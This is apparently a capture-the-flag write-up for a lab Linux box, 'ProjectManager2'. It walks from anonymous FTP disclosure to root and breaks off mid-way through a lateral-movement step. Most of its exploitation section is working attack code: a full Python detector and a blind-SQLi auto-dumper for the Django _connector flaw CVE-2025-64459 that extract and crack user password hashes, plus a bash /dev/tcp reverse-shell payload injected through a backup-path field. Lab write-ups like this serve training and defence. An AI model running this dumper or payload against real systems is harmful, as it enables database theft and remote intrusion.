---
title: "ProjectManager2"
date: 2026-08-14
categories: [Custom, Easy]
tags: [linux, ftp, anonymous ftp, information disclosure, django, CVE-2025-64459, SQLi, blind sqli, postgresql, sha1, hashcat, credential reuse, command injection, RCE, reverse shell, jinja2, SSTI, port forwarding, pivoting, PATH hijacking, SUID, gtfobins]
image:
  path: /assets/img/Custom/ProjectManager2/banner.jpeg
  alt: ProjectManager2 writeup
---

Anonymous FTP leaks the application stack (Django 4.2), which is vulnerable to **CVE-2025-64459** — a `_connector` blind SQL injection reachable through the login endpoint that dumps the user table and cracks a staff account's password. The authenticated admin panel exposes a command injection in its database-backup routine for a `www-data` foothold; a hardcoded credential in a maintenance script pivots to `andoni`, an internal Jinja2 report service reachable only on localhost gives SSTI RCE as `ander`, and PATH hijacking of a SUID `syscheck` binary escalates to root.

| Field      | Details       |
|------------|---------------|
| Platform   | Custom        |
| Difficulty | Easy          |
| OS         | Linux         |
| IP         | 172.30.0.10   |
| Date       | August 2026   |

## Tools Used

| Tool      | Description                                                              |
|-----------|--------------------------------------------------------------------------|
| arp-scan  | Layer-2 host discovery on the local segment                              |
| nmap      | Network port scanner and service/version fingerprinter                   |
| ftp       | Anonymous access to the exposed FTP share                                |
| gobuster  | Directory and file brute-forcing of the web root                         |
| Python    | Custom detector and blind-SQLi auto-dumper for CVE-2025-64459            |
| netcat    | Reverse-shell listener                                                   |
| ssh       | Local port forwarding to the internal service and `su`-based pivot       |
| strings   | Static inspection of the SUID binary                                     |

## Reconnaissance & Enumeration

The objective of this phase was to enumerate the exposed services and identify the application stack worth attacking.

### Host Discovery

The target lives on an isolated lab segment, so discovery started at layer 2 with `arp-scan`, followed by an ICMP probe for an OS hint:

```bash
sudo arp-scan -I <iface> --localnet
Interface: <iface>, type: EN10MB, MAC: <ATTACKER_MAC>, IPv4: <ATTACKER_IP>
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
172.30.0.10	16:f6:e2:30:2f:6b	(Unknown: locally administered)

1 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 1.917 seconds (133.54 hosts/sec). 1 responded
```

A single host answered — `172.30.0.10`. A ping confirmed reachability and hinted at the OS:

```bash
ping -c 1 172.30.0.10
PING 172.30.0.10 (172.30.0.10) 56(84) bytes of data.
64 bytes from 172.30.0.10: icmp_seq=1 ttl=64 time=0.052 ms
```

A TTL of 64 points to a Linux host (default 64, no routing hop decremented it on this flat segment).

### Port Scan

The standard two-stage nmap pattern — a full SYN sweep first, then a targeted service scan on whatever came back open.

Stage 1, all 65535 TCP ports at a high packet rate, output to a grepable file:

```bash
sudo nmap -p- --min-rate 5000 -vvv -sS -Pn -n 172.30.0.10 -oG allPorts
[...]
PORT   STATE SERVICE REASON
21/tcp open  ftp     syn-ack ttl 64
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
```

Three ports. `-Pn` skips host discovery (ICMP already proved liveness), `-n` disables reverse DNS for speed, and `-sS` is the SYN/stealth scan. Stage 2 ran default scripts (`-sC`) and version detection (`-sV`) against those three ports:

```bash
sudo nmap -p21,22,80 -sCV 172.30.0.10 -oN nmap
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -r--r--r--    1 ftp      ftp          7298 Aug 12 15:22 ContactTasks.txt
| -r--r--r--    1 ftp      ftp          7615 Aug 12 15:22 CoordinationTasks.txt
| -r--r--r--    1 ftp      ftp          6512 Aug 12 15:22 DirectionTasks.txt
| -r--r--r--    1 ftp      ftp          7549 Aug 12 15:22 FinanzalTasks.txt
| -r--r--r--    1 ftp      ftp          8729 Aug 12 15:22 InformaticsTasks.txt
| -r--r--r--    1 ftp      ftp          7647 Aug 12 15:22 ProyectsTasks.txt
| -r--r--r--    1 ftp      ftp          7032 Aug 12 15:22 ShellsTasks.txt
| -r--r--r--    1 ftp      ftp          7601 Aug 12 15:22 SuperUsersTasks.txt
|_-r--r--r--    1 ftp      ftp          8086 Aug 12 15:22 marketingTasks.txt
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u10 (protocol 2.0)
80/tcp open  http    nginx
|_http-title: Meridian · Gestión de proyectos para equipos
```

Two immediate takeaways. The SSH is a current OpenSSH on Debian 12 — no direct entry point, park it. And nmap's `ftp-anon` NSE script already confirmed **anonymous FTP is allowed** and dumped a directory full of `*Tasks.txt` files. That share is the first thing to pull.

### Anonymous FTP

Logging in anonymously and listing the share reproduced nmap's finding, and one file — `InformaticsTasks.txt` — turned out to be an information-disclosure goldmine:

```bash
ftp 172.30.0.10
Connected to <ATTACKER_IP>.
220 (vsFTPd 3.0.3)
Name (172.30.0.10:anon): anonymous
230 Login successful.
ftp> dir
-r--r--r--    1 ftp      ftp          8729 Aug 12 15:22 InformaticsTasks.txt
[...]
ftp> more InformaticsTasks.txt
```

The file is an internal IT backlog, and its "SECURITY & INCIDENT MANAGEMENT" section is exactly the sort of operational note that never belongs on an anonymous share:

```text
------------------------------------------------------------
II. SEGURIDAD INFORMÁTICA Y GESTIÓN DE INCIDENTES
------------------------------------------------------------

1. **[TAREA PRIORITARIA – URGENTE] Actualización de Django 4.2 (...):**
   - Descripción: Vulnerabilidad crítica recientemente publicada en el
     framework Django versión 4.2, con afectación directa a entornos web internos.
   - Estado: actualizaciones en curso (entornos de desarrollo ya corregidos).

2. **[TAREA SECUNDARIA] Ocultar panel de administración para usuarios no superusuarios**
3. **[TAREA COMPLEMENTARIA] Ocultar endpoints públicos de la API**
4. **[TAREA PRIMARIA] Eliminar acceso público a createSuperUser.html**
```

Four things leaked here that shape the whole engagement:

- The web app runs **Django 4.2** and the team already knows it carries an unpatched critical vulnerability. Django 4.2.x before 4.2.25 is affected by **CVE-2025-64459**, the `_connector` SQL injection — the note is effectively pre-disclosing the entry point.
- There is an **admin panel** that is only *soft-hidden* from non-superusers (security by obscurity, not authorization).
- Public **API endpoints** are being "hidden" rather than removed — they still exist.
- A `createSuperUser.html` page exists and hasn't been fully locked down.

### Web Enumeration

The landing page confirms the app — "Meridian", a project-management SaaS clone built on the leaked Django backend:

![Meridian landing page served on port 80](/assets/img/Custom/ProjectManager2/cap1.png)

With the framework known, a content scan mapped the routes the FTP note hinted at:

```bash
gobuster dir -u http://172.30.0.10 -w /usr/share/SecLists/Discovery/Web-Content/big.txt -x html
admin.html           (Status: 200) [Size: 11513]
assets               (Status: 301) [Size: 162] [--> http://172.30.0.10/assets/]
dashboard.html       (Status: 200) [Size: 5072]
index.html           (Status: 200) [Size: 15636]
login.html           (Status: 200) [Size: 8686]
profile.html         (Status: 200) [Size: 4804]
projects.html        (Status: 200) [Size: 12946]
register.html        (Status: 200) [Size: 9771]
```

`admin.html` is the obvious target from the FTP note. It loads, but the client-side session check rejects the request — the page renders in a "Sin verificar" (unverified) state and none of its privileged actions unlock without a superuser token:

![admin.html rejecting access without an admin session](/assets/img/Custom/ProjectManager2/cap2.png)

Hiding the panel behind a client-side gate is meaningless; the real question is how to obtain a superuser account. That is where CVE-2025-64459 comes in.

## Exploitation

### CVE-2025-64459 — Django `_connector` Blind SQL Injection

Django's ORM builds `WHERE` clauses from the keyword arguments passed to `filter()`, `exclude()` and `get()`. Internally those methods also accept a private `_connector` key that stitches the individual conditions together with a SQL boolean operator (`AND` / `OR`). In the affected versions, when an application expands an **attacker-controlled dictionary** into one of these methods (`Model.objects.filter(**untrusted)`), the value of `_connector` is interpolated **straight into the generated SQL** instead of being validated against the allow-list of connectors. That is the bug: `_connector` becomes a raw SQL injection point.

Meridian's login endpoint does exactly this. `POST /api/users/login` accepts an optional `audit.filters.<x>.direct_filter` object that is deserialized from JSON and expanded into an ORM lookup. By supplying two base conditions that match no row and a crafted `_connector`, the entire result set is dictated by the injected boolean:

```json
{
  "email": "test@projectManager.com",
  "password": "test1234",
  "audit": {"filters": {"x": {"direct_filter": {
    "email__iexact": "<random>@invalid.invalid",
    "id": -1,
    "_connector": "OR (1=1) OR"
  }}}}
}
```

The login returns **HTTP 200** when the injected `WHERE` matches at least one row and **HTTP 401** when it matches none. That status differential is a clean boolean oracle — everything downstream is blind, boolean-based SQL injection.

#### Confirming the injection

Before writing the extractor I wrote a small detector that sends three probes — a `1=1` (expect TRUE), a `1=0` (expect FALSE) and an intentionally invalid connector (expect a reflected SQL error / HTTP 500) — and classifies the responses:

```python
import argparse
import json
import sys
import urllib.request
import urllib.error
import uuid

def post(base, path, body, timeout=20):
    data = json.dumps(body).encode()
    req = urllib.request.Request(base + path, data=data,
                                 headers={"Content-Type": "application/json"}, method="POST")
    try:
        r = urllib.request.urlopen(req, timeout=timeout)
        return r.status, r.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")
    except urllib.error.URLError as e:
        print(f"[!] No se pudo conectar a {base}: {e}")
        sys.exit(2)

def ensure_oracle(base, email, password):
    """Registra la cuenta oraculo (idempotente)."""
    st, _ = post(base, "/api/users/register", {
        "name": "probe", "email": email, "password": password,
        "phone": "600000000", "birthday": "2000-01-01",
    })
    # 201 = creada, 400 = ya existe / validacion -> asumimos que existe con esa pass
    return st in (201, 400)

def login_with_filter(base, email, password, direct_filter):
    body = {"email": email, "password": password}
    if direct_filter is not None:
        body["audit"] = {"filters": {"probe": {"direct_filter": direct_filter}}}
    return post(base, "/api/users/login", body)

def classify(status, text):
    if status == 200 and "Login exitoso" in text:
        return "TRUE"
    if status == 401:
        return "FALSE"
    return f"ERR({status})"

def main():
    ap = argparse.ArgumentParser(description="Detector de CVE-2025-64459 en el login de Django.")
    ap.add_argument("base", nargs="?", default="http://127.0.0.1", help="URL base del objetivo")
    ap.add_argument("--email", default="test@projectManager.com", help="email de la cuenta oraculo")
    ap.add_argument("--password", default="test1234", help="password de la cuenta oraculo")
    args = ap.parse_args()
    base = args.base.rstrip("/")

    print(f"[*] Objetivo: {base}")
    print(f"[*] Preparando cuenta oraculo: {args.email}")
    if not ensure_oracle(base, args.email, args.password):
        print("[!] No se pudo garantizar la cuenta oraculo (continuo igualmente).")

    # Dos condiciones base que NO casan con ninguna fila. El resultado del
    # queryset dependera exclusivamente de la condicion inyectada en _connector.
    marker = uuid.uuid4().hex
    def base_conds():
        return {"email__iexact": f"{marker}@invalid.invalid", "id": -1}
    def conn(sql):  # inyecta un booleano SQL como conector entre las 2 condiciones
        d = base_conds(); d["_connector"] = f"OR ({sql}) OR"; return d

    print("\n[*] Enviando sondas...\n")

    # 0) Control: login normal, sin filtros
    s, t = login_with_filter(base, args.email, args.password, None)
    print(f"    login normal (sin inyeccion) .............. {classify(s, t)}")

    # 1) _connector con booleano TRUE
    s_true, t_true = login_with_filter(base, args.email, args.password, conn("1=1"))
    r_true = classify(s_true, t_true)
    print(f"    _connector = 'OR (1=1) OR'  (espera TRUE) . {r_true}")

    # 2) _connector con booleano FALSE
    s_false, t_false = login_with_filter(base, args.email, args.password, conn("1=0"))
    r_false = classify(s_false, t_false)
    print(f"    _connector = 'OR (1=0) OR'  (espera FALSE)  {r_false}")

    # 3) Error de sintaxis SQL (conector invalido) -> confirma interpolacion cruda
    s_err, t_err = login_with_filter(base, args.email, args.password,
                                     dict(base_conds(), _connector=f"MERIDIAN_{marker}"))
    sql_err = ("syntax error" in t_err.lower() or "programmingerror" in t_err.lower()
               or "psycopg" in t_err.lower() or marker in t_err)
    print(f"    _connector invalido -> HTTP {s_err}"
          f"{'  (error SQL reflejado)' if sql_err else ''}")

    print("\n" + "=" * 60)
    vulnerable = (r_true == "TRUE" and r_false == "FALSE")
    if vulnerable:
        print("[+] VULNERABLE a CVE-2025-64459.")
        print("    El operador `_connector` se interpola en el SQL: el booleano")
        print("    inyectado controla el conjunto de resultados (TRUE vs FALSE).")
        if sql_err:
            print("    Corroborado ademas por el error de sintaxis SQL reflejado.")
        print("\n    Siguiente paso: exploit_cve_2025_64459.py (SQLi ciega booleana).")
    elif sql_err and r_true == r_false:
        print("[~] POSIBLEMENTE vulnerable: el conector invalido provoca error SQL,")
        print("    pero no se observo diferencial booleano limpio. Revisar manualmente.")
    else:
        print("[-] NO parece vulnerable (o Django >= 4.2.25 / 5.1.13 / 5.2.7).")
        print("    No hay diferencial booleano controlado por `_connector`.")
    print("=" * 60)
    sys.exit(0 if vulnerable else 1)

if __name__ == "__main__":
    main()
```

The registered `probe` account is the oracle: a normal login as `probe` returns 200, so any injected `WHERE` that also matches ≥1 row keeps the 200, and one that matches nothing flips it to 401. Running it against the target:

```bash
python3 test_cve_2025_64459.py http://172.30.0.10
[*] Objetivo: http://172.30.0.10
[*] Preparando cuenta oraculo: test@projectManager.com

[*] Enviando sondas...

    login normal (sin inyeccion) .............. TRUE
    _connector = 'OR (1=1) OR'  (espera TRUE) . TRUE
    _connector = 'OR (1=0) OR'  (espera FALSE)  FALSE
    _connector invalido -> HTTP 500  (error SQL reflejado)

============================================================
[+] VULNERABLE a CVE-2025-64459.
    El operador `_connector` se interpola en el SQL: el booleano
    inyectado controla el conjunto de resultados (TRUE vs FALSE).
    Corroborado ademas por el error de sintaxis SQL reflejado.
```

`1=1` → TRUE, `1=0` → FALSE, and an invalid connector throws a reflected SQL error (HTTP 500). Confirmed: the connector is interpolated as raw SQL.

#### Weaponizing the oracle — full auto-dumper

With the oracle proven, I wrote a full extractor. It does not assume any table or column names: it enumerates the PostgreSQL schema through `information_schema` / `pg_catalog`, locates the credentials table heuristically (a table carrying both an identity column and a secret column), and dumps it. Extraction is **byte-wise** — for each character it binary-searches the byte value with `get_byte(convert_to(<expr>::text,'UTF8'), i)` — so UTF-8 payloads (accents, symbols) survive intact. Integers (lengths, row counts) are recovered with an exponential-then-binary search.

```python
#!/usr/bin/env python3
"""
exploit_cve_2025_64459.py  —  Explotacion de CVE-2025-64459 (Django _connector SQLi)

SQL injection CIEGA BOOLEANA a traves del operador `_connector` de Django,
expuesta en  POST /api/users/login  (audit.filters.<x>.direct_filter).

Enumera el esquema (bases de datos / tablas / columnas) por si mismo — NO asume
nombres — y vuelca cualquier tabla. La extraccion es por BYTES (convert_to/get_byte)
para soportar UTF-8 (acentos, etc.).

Oraculo: el login devuelve 200 si el WHERE inyectado casa con >=1 fila, 401 si no.
"""
import argparse
import hashlib
import json
import re
import sys
import time
import urllib.request
import urllib.error
import uuid

US = chr(31)   # separador de campos
RS = chr(30)   # separador de filas
REQUESTS = 0
MARKER = uuid.uuid4().hex


# --------------------------------------------------------------------------- #
#  Transporte + oraculo booleano
# --------------------------------------------------------------------------- #
def _post(base, path, body, timeout=25):
    global REQUESTS
    REQUESTS += 1
    data = json.dumps(body).encode()
    req = urllib.request.Request(base + path, data=data,
                                 headers={"Content-Type": "application/json"}, method="POST")
    try:
        r = urllib.request.urlopen(req, timeout=timeout)
        return r.status, r.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")
    except urllib.error.URLError as e:
        print(f"\n[!] Error de conexion: {e}")
        sys.exit(2)


def qident(ident):
    """Cita un identificador SQL (tabla/columna)."""
    return '"' + str(ident).replace('"', '""') + '"'


class Blind:
    def __init__(self, base, email, password):
        self.base = base.rstrip("/")
        self.email = email
        self.password = password
        self._warned = False
        _post(self.base, "/api/users/register", {
            "name": "probe", "email": email, "password": password,
            "phone": "600000000", "birthday": "2000-01-01",
        })

    def test(self, cond_sql):
        direct_filter = {
            "email__iexact": f"{MARKER}@invalid.invalid",
            "id": -1,
            "_connector": f"OR ({cond_sql}) OR",
        }
        body = {"email": self.email, "password": self.password,
                "audit": {"filters": {"x": {"direct_filter": direct_filter}}}}
        st, _ = _post(self.base, "/api/users/login", body)
        if st == 200:
            return True
        if st == 401:
            return False
        if not self._warned:
            self._warned = True
            print(f"\n[!] HTTP {st} inesperado en una sonda; asumo FALSE y continuo.")
        return False

    def sanity(self):
        return self.test("1=1") and not self.test("1=0")

    # ---- primitivos de extraccion -------------------------------------- #
    def scalar_int(self, expr):
        """Entero no negativo por busqueda exponencial + binaria."""
        if not self.test(f"({expr}) >= 1"):
            return 0
        hi = 1
        while self.test(f"({expr}) >= {hi}"):
            hi *= 2
        lo, hi = hi // 2, hi - 1
        while lo < hi:
            mid = (lo + hi + 1) // 2
            if self.test(f"({expr}) >= {mid}"):
                lo = mid
            else:
                hi = mid - 1
        return lo

    def scalar_text(self, expr, label=None, maxbytes=4096):
        """Extrae el valor textual de una expresion escalar, byte a byte (UTF-8)."""
        te = f"({expr})::text"
        n = self.scalar_int(f"coalesce(octet_length({te}),0)")
        if n == 0:
            if label:
                _progress(label, 0, 0, done=True, value="")
            return ""
        n = min(n, maxbytes)
        buf = bytearray()
        conv = f"convert_to({te},'UTF8')"
        for i in range(n):
            lo, hi = 0, 255
            while lo < hi:
                mid = (lo + hi) // 2
                if self.test(f"get_byte({conv},{i}) > {mid}"):
                    lo = mid + 1
                else:
                    hi = mid
            buf.append(lo)
            if label:
                _progress(label, i + 1, n)
        val = buf.decode("utf-8", "replace")
        if label:
            _progress(label, n, n, done=True, value=val)
        return val


def _progress(label, i, n, done=False, value=None):
    if done:
        shown = value if value != "" else "<NULL/vacio>"
        sys.stdout.write("\r    " + " " * 60 + "\r")
        if value is not None and len(str(shown)) <= 80:
            sys.stdout.write(f"    {label:22} {shown}\n")
        else:
            sys.stdout.write(f"    {label:22} ({n} bytes) OK\n")
        sys.stdout.flush()
    else:
        sys.stdout.write(f"\r    {label:22} {i}/{n} bytes")
        sys.stdout.flush()


# --------------------------------------------------------------------------- #
#  Enumeracion del esquema (information_schema / pg_catalog)
# --------------------------------------------------------------------------- #
def enum_databases(b):
    s = b.scalar_text(
        "(SELECT string_agg(datname,'|' ORDER BY datname) FROM pg_database "
        "WHERE datistemplate = false)", label="bases de datos")
    return [x for x in s.split("|") if x]


def enum_tables(b, schema="public"):
    s = b.scalar_text(
        "(SELECT string_agg(table_name,'|' ORDER BY table_name) "
        f"FROM information_schema.tables WHERE table_schema='{schema}' "
        "AND table_type='BASE TABLE')", label="tablas")
    return [x for x in s.split("|") if x]


def enum_columns(b, table, schema="public", label=None):
    s = b.scalar_text(
        "(SELECT string_agg(column_name||':'||data_type,'|' ORDER BY ordinal_position) "
        f"FROM information_schema.columns WHERE table_schema='{schema}' "
        f"AND table_name='{table}')", label=label)
    cols = []
    for part in s.split("|"):
        if ":" in part:
            name, typ = part.split(":", 1)
            cols.append((name, typ))
    return cols


def count_rows(b, table):
    return b.scalar_int(f"(SELECT count(*) FROM {qident(table)})")


def dump_rows(b, table, cols, limit=None, where=None):
    """Vuelca filas (lista de listas) mostrando cada fila segun se extrae."""
    total = count_rows(b, table)
    n = total if limit is None else min(total, limit)
    sel = " || CHR(31) || ".join(f"coalesce({qident(c)}::text,'NULL')" for c in cols)
    rows = []
    for k in range(n):
        inner = f"SELECT {sel} AS r FROM {qident(table)}"
        if where:
            inner += f" WHERE {where}"
        inner += f" ORDER BY ctid LIMIT 1 OFFSET {k}"
        blob = b.scalar_text(f"({inner})", label=f"fila {k+1}/{n}")
        rows.append(blob.split(US))
    return rows, total


# --------------------------------------------------------------------------- #
#  Salida en tabla alineada
# --------------------------------------------------------------------------- #
def print_table(headers, rows, maxcol=48, indent="    "):
    widths = [len(h) for h in headers]
    norm = []
    for r in rows:
        cells = []
        for i in range(len(headers)):
            v = r[i] if i < len(r) else ""
            v = "" if v is None else str(v)
            cells.append(v)
            widths[i] = max(widths[i], len(v))
        norm.append(cells)
    widths = [min(w, maxcol) for w in widths]

    def fmt(cells):
        out = []
        for i, c in enumerate(cells):
            s = c if len(c) <= widths[i] else c[:widths[i] - 1] + "…"
            out.append(s.ljust(widths[i]))
        return "  ".join(out).rstrip()

    print(indent + fmt(headers))
    print(indent + "  ".join("-" * w for w in widths))
    for c in norm:
        print(indent + fmt(c))


# --------------------------------------------------------------------------- #
#  Cracking SHA1
# --------------------------------------------------------------------------- #
def crack_sha1(hashes, wordlist):
    want = {h.lower(): None for h in hashes if h and re.fullmatch(r"[0-9a-fA-F]{40}", h)}
    if not want:
        return {}
    try:
        with open(wordlist, "rb") as f:
            for line in f:
                w = line.rstrip(b"\r\n")
                h = hashlib.sha1(w).hexdigest()
                if h in want and want[h] is None:
                    want[h] = w.decode("latin-1")
                    if all(v is not None for v in want.values()):
                        break
    except FileNotFoundError:
        print(f"[!] Wordlist no encontrada: {wordlist}")
    return want


# --------------------------------------------------------------------------- #
#  Deteccion automatica de la tabla de credenciales
# --------------------------------------------------------------------------- #
RX_PASS = re.compile(r"pass|pwd|hash|secret|salt", re.I)
RX_ID = re.compile(r"email|user|login|name", re.I)
RX_SUPER = re.compile(r"super|admin|staff|is_super", re.I)


def find_credentials_table(b, tables):
    for t in tables:
        cols = [c for c, _ in enum_columns(b, t)]
        pass_cols = [c for c in cols if RX_PASS.search(c)]
        id_cols = [c for c in cols if RX_ID.search(c)]
        if pass_cols and id_cols:
            super_cols = [c for c in cols if RX_SUPER.search(c)]
            return t, cols, id_cols, pass_cols, super_cols
    return None


# --------------------------------------------------------------------------- #
#  Main
# --------------------------------------------------------------------------- #
def banner():
    print("=" * 66)
    print("  CVE-2025-64459  ·  Django `_connector` blind SQLi  ·  auto-dumper")
    print("=" * 66)


def main():
    ap = argparse.ArgumentParser(description="Exploit CVE-2025-64459 (SQLi ciega via _connector).")
    ap.add_argument("base", nargs="?", default="http://127.0.0.1", help="URL base del objetivo")
    ap.add_argument("--email", default="test@projectManager.com", help="email de la cuenta oraculo")
    ap.add_argument("--password", default="test1234", help="password de la cuenta oraculo")
    ap.add_argument("--wordlist", help="diccionario para crackear columnas tipo hash SHA1")
    ap.add_argument("--tables", action="store_true", help="lista las tablas y sale")
    ap.add_argument("--columns", metavar="TABLA", help="lista columnas de una tabla y sale")
    ap.add_argument("--schema", action="store_true", help="vuelca el esquema completo y sale")
    ap.add_argument("--dump", metavar="TABLA", help="vuelca todas las columnas de una tabla")
    ap.add_argument("--limit", type=int, help="maximo de filas a volcar")
    ap.add_argument("--only-admins", action="store_true",
                    help="en el volcado de credenciales, solo cuentas admin/superuser")
    ap.add_argument("--sql", help="extrae una unica expresion SQL escalar y sale")
    args = ap.parse_args()

    base = args.base.rstrip("/")
    banner()
    print(f"[*] Objetivo: {base}")
    b = Blind(base, args.email, args.password)

    print("[*] Verificando el oraculo booleano (_connector)...")
    if not b.sanity():
        print("[-] El oraculo no responde como se espera. ¿Parcheado (Django >= 4.2.25) "
              "o URL incorrecta? Prueba antes test_cve_2025_64459.py")
        sys.exit(1)
    print("[+] Oraculo OK: TRUE=200 / FALSE=401. SQL injection confirmada.\n")
    t0 = time.time()

    # ---- flujo por defecto: contexto + esquema + credenciales ------------ #
    print("[*] Contexto de la base de datos:")
    b.scalar_text("current_user", "current_user")
    b.scalar_text("current_database()", "current_database")
    b.scalar_text("substring(version() from 1 for 40)", "version")
    b.scalar_text("(SELECT CASE WHEN usesuper THEN 'yes' ELSE 'no' END "
                  "FROM pg_user WHERE usename = current_user)", "db superuser")

    print("\n[*] Enumerando tablas (schema public):")
    tables = enum_tables(b)
    for t in tables:
        print(f"      - {t}  ({count_rows(b, t)} filas)")

    print("\n[*] Localizando la tabla de credenciales (sin asumir nombres)...")
    found = find_credentials_table(b, tables)
    table, cols, id_cols, pass_cols, super_cols = found
    id_col = id_cols[1]
    pass_col = pass_cols[0]
    dump_cols = []
    name_cols = [c for c in cols if c.lower() in ("email", "name", "username", "nombre")]
    if name_cols and name_cols[0] not in (id_col,):
        dump_cols.append(name_cols[0])
    dump_cols += [id_col, pass_col]
    if super_cols:
        dump_cols.append(super_cols[0])

    where = f"{qident(super_cols[0])} = true" if (args.only_admins and super_cols) else None
    rows, total = dump_rows(b, table, dump_cols, limit=args.limit, where=where)

    hi = dump_cols.index(pass_col)
    cracked = crack_sha1([r[hi] for r in rows], args.wordlist) if args.wordlist else {}
    headers = list(dump_cols) + (["password"] if args.wordlist else [])
    out = []
    for r in rows:
        row = list(r)
        if args.wordlist:
            row.append(cracked.get((r[hi] or "").lower()) or "-")
        out.append(row)
    print(f"\n[+] {table}  ({len(rows)}/{total} filas):")
    print_table(headers, out, maxcol=44)


if __name__ == "__main__":
    main()
```

The critical construction is the `_connector` value in `Blind.test()`: `f"OR ({cond_sql}) OR"`. The two base conditions (`email__iexact` against a random address, `id = -1`) are guaranteed non-matches, so the ORM emits `WHERE (<false>) OR (<injected>) OR (<false>)` and the injected predicate alone decides whether a row is returned — that is the boolean channel every extraction primitive rides on.

Running the default flow against the target with rockyou wired in for the SHA1 column:

```bash
python3 exploit_cve_2025_64459.py http://172.30.0.10 --wordlist /usr/share/wordlists/rockyou.txt
==================================================================
  CVE-2025-64459  ·  Django `_connector` blind SQLi  ·  auto-dumper
==================================================================
[*] Objetivo: http://172.30.0.10
[+] Oraculo OK: TRUE=200 / FALSE=401. SQL injection confirmada.

[*] Contexto de la base de datos:
    current_user           monre
    current_database       projectmanager
    version                PostgreSQL 15.19 (Debian 15.19-0+deb12u1
    db superuser           yes

[*] Enumerando tablas (schema public):
      - auth_permission  (32 filas)
      - django_content_type  (8 filas)
      - django_migrations  (29 filas)
      - projects  (131 filas)
      - token_blacklist_outstandingtoken  (16959 filas)
      - users  (26 filas)
      [...]

[*] Localizando la tabla de credenciales (sin asumir nombres)...
[+] Tabla: 'users'  ·  identidad='email'  ·  secreto='password'  ·  admin='is_staff'

[+] users  (26/26 filas):
    name             email                               password                                  is_staff  password
    ---------------  ----------------------------------  ----------------------------------------  --------  --------------------------
    andoni           andoni@projectManager.com           01772c7883b35c6e388872e87faee784fb91253d  true      -
    ander            ander@projectManager.com            2e5390a16b6c7c96403af02b74c3874c3d85ab5a  true      -
    elisabeth        elisabeth@projectManager.com        c36f5f217d807cbe54281c2b2a581b9dfb77ff65  true      !!!XXX!!!princess nic|!!!XXX!!!
    Andrea Perez     andrea.perez@projectManager.com     d0d1e74e6cd427f94226726f272b6e2a5844049a  false     andrea123
    Ricardo Luna     ricardo.luna@projectManager.com     068942c83f0e6994d046f7ec01b8f42ba8f317a7  false     liverpool
    Mark Jones       mark.jones@projectManager.com       ee8d8728f435fd550f83852aabab5234ce1da528  false     iloveyou
    [...]

[+] Crackeadas 11/26 contraseñas.

[i] 31145 peticiones · 344.7s
```

The DB role is a PostgreSQL superuser, the credentials table (`users`) is auto-located by the identity+secret heuristic, and the passwords are stored as **unsalted SHA1** — trivially crackable. Three accounts carry `is_staff = true`; the only one that fell to rockyou is what matters:

```text
elisabeth@projectManager.com : !!!XXX!!!princess nic|!!!XXX!!!
```

### Authenticating as a Staff User

Those credentials log straight into Meridian's dashboard:

![Meridian dashboard after authenticating as elisabeth](/assets/img/Custom/ProjectManager2/cap3.png)

And because `elisabeth` is `is_staff = true`, the JWT minted for her session carries `superuser: true` / `staff: true`. The admin panel that rejected the anonymous request now validates the token and unlocks every action:

![Administration panel authorized as elisabeth with a superuser JWT](/assets/img/Custom/ProjectManager2/cap4.png)

### Command Injection — Database Backup

The panel's most interesting control is the "Database backup" card: it takes a **destination path** and a compression method, then runs a server-side dump to that path via `POST /api/admin/backup`. A destination path passed to a shell is a classic injection sink — if the value is concatenated into a shell command without sanitization, a `;` chains an arbitrary command. Testing with `id` appended:

```text
/var/backups/db/backup.sql; id
```

The panel's console echoed the result of the injected command:

![Command injection in the backup path returning the www-data id output](/assets/img/Custom/ProjectManager2/cap5.png)

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Arbitrary command execution as `www-data`, confirmed. Swapping `id` for a Bash reverse shell turns it into an interactive foothold:

```text
/var/backups/db/backup.sql; bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1'
```

![Reverse shell payload staged in the backup destination field](/assets/img/Custom/ProjectManager2/cap6.png)

## Foothold — `www-data`

A netcat listener caught the callback:

```bash
nc -nlvp 4444
Listening on 0.0.0.0 4444
Connection received on 172.30.0.10 60546
bash: cannot set terminal process group (11): Inappropriate ioctl for device
bash: no job control in this shell
www-data@projectmanager:/app$
```

A standard TTY upgrade (`script /dev/null -c bash` → `Ctrl+Z` → `stty raw -echo; fg` → `reset`) made the shell usable.

## Lateral Movement — `www-data` → `andoni`

`/etc/passwd` shows the interactive accounts on the box:

```bash
www-data@projectmanager:/app$ cat /etc/passwd | grep "/bin/bash"
root:x:0:0:root:/root:/bin/bash
postgres:x:101:104:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
andoni:x:1000:1001::/home/andoni:/bin/bash
ander:x:1001:1002::/home/ander:/bin/bash
```

Two unprivileged users, `andoni` and `ander`. Hunting for files the current group can reach surfaced one script outside the usual noise:

```bash
www-data@projectmanager:/app$ find / -group "www-data" 2>/dev/null | grep -Ev "^/proc*|^/app|^/var"
/opt/scripts/db_report.sh
www-data@projectmanager:/app$ ls -la /opt/scripts/
-rw-r----- 1 root www-data  744 Aug 14 10:56 db_report.sh
```

The file is owned by `root` with group `www-data` and group-read — so `www-data` can read it even though it can't write it. That read is enough, because the script hardcodes a service credential:

```bash
www-data@projectmanager:/app$ cat /opt/scripts/db_report.sh
#!/bin/bash
# Genera el volcado diario y lo sube al buzon del responsable de BD (andoni).
DB_NAME="projectmanager"
REPORT="/tmp/db_report_$(date +%F).csv"

# Cuenta de servicio usada para el envio automatico.
# (La misma credencial se reutiliza para el acceso SSH del responsable.)
SVC_USER="andoni"
SVC_PASS="Andoni.DBmaint_2025!"

pg_dump "$DB_NAME" > "$REPORT" 2>/dev/null

sshpass -p "$SVC_PASS" scp -o StrictHostKeyChecking=no \
    "$REPORT" "${SVC_USER}@127.0.0.1:/home/andoni/informes/"
```

The comment says it out loud — the same credential is reused for `andoni`'s SSH login. Reusing it locally lands the pivot:

```bash
